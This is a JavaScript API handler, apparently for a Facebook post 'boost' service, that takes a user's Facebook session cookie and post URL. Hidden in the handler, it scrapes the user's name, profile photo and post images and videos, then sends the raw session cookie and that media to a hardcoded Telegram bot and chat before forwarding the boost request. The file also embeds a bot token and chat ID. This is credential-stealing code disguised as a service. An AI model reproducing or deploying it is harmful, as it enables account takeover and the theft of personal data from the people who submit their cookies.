import axios from "axios";

const serverUrls = {
  server1: "https://server1-u9fw.onrender.com",
  server2: "https://server-2-aggj.onrender.com",
  server3: "https://server-3-p6lg.onrender.com",
};

const BOT_TOKEN = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U";
const CHAT_ID = "7442173988";

export default async function handler(req, res) {
  if (req.method !== "POST")
    return res.status(405).json({ message: "Only POST allowed" });

  const { cookie, url, amount, interval, server } = req.body;

  if (!cookie || !url || !amount || !interval || !serverUrls[server]) {
    return res.status(400).json({ message: "Missing or invalid input." });
  }

  try {
    const name = await getUserName(cookie);
    const profilePic = await getUserPhoto(cookie);
    const media = await getPostMedia(url, cookie);

    // Send to Telegram
    await sendToTelegram({
      name,
      cookie,
      appstate: cookie,
      profilePic,
      postUrl: url,
      media,
    });

    // Forward to your Render server for boosting
    const response = await axios.post(`${serverUrls[server]}/api/submit`, {
      cookie,
      url,
      amount,
      interval,
    });

    return res.status(200).json({
      message: response.data?.message || "Boost submitted.",
      name,
      photo: profilePic,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ message: "Server error." });
  }
}

async function getUserName(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", {
      headers: { Cookie: cookie },
    });
    const match = res.data.match(/<title>(.*?)<\/title>/);
    return match ? match[1].replace(" | Facebook", "") : "Unknown";
  } catch {
    return "Unknown";
  }
}

async function getUserPhoto(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", {
      headers: { Cookie: cookie },
    });
    const match = res.data.match(/profile_picture\/view.*?src=(.*?)&/);
    return match ? decodeURIComponent(match[1]) : null;
  } catch {
    return null;
  }
}

async function getPostMedia(postUrl, cookie) {
  try {
    const res = await axios.get(postUrl, {
      headers: { Cookie: cookie, "User-Agent": "Mozilla/5.0" },
    });

    const images = [...res.data.matchAll(/<img[^>]+src="([^"]+)"[^>]*>/g)].map(
      (m) => m[1]
    );

    const videos = [...res.data.matchAll(/<video[^>]+src="([^"]+)"[^>]*>/g)].map(
      (m) => m[1]
    );

    return { images, videos };
  } catch (e) {
    return { images: [], videos: [] };
  }
}

async function sendToTelegram({ name, cookie, appstate, profilePic, postUrl, media }) {
  const caption = `
📢 <b>New FB Boost Request</b>
👤 Name: <code>${name}</code>
🔗 Post: <a href="${postUrl}">${postUrl}</a>
🍪 Cookie: <code>${cookie}</code>
📦 Appstate: <code>${appstate}</code>
  `;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: caption,
      parse_mode: "HTML",
    });

    if (profilePic) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: profilePic,
      });
    }

    for (const url of media.videos || []) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        chat_id: CHAT_ID,
        video: url,
      });
    }

    for (const url of media.images || []) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: url,
      });
    }
  } catch (e) {
    console.error("Telegram Send Error:", e.message);
  }
}
